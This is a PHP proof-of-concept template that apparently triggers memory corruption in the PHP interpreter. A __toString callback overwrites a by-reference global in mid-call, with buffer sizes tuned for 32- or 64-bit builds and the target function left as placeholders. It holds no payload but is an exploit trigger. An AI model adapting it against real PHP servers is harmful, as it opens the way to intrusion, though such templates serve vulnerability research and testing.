<?php

class charlist
{
     function __toString()
     {
         $ret = '';
         for ($i=0; $i<=255; $i++) $ret .= chr($i);
         
         /* now the magic */
         parse_str("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=1", $GLOBALS['var']);
         return $ret;
     }
}

/* Detect 32 vs 64 bit */
$i = 0x7fffffff;
$i++;
if (is_float($i)) {
     $GLOBALS['var'] = str_repeat("A", 39);
} else {
     $GLOBALS['var'] = str_repeat("A", 67);      
}

/* Trigger the Code */
$x = %{funcname}(%{args2}&$GLOBALS['var'], 1, new charlist());
var_dump($x);
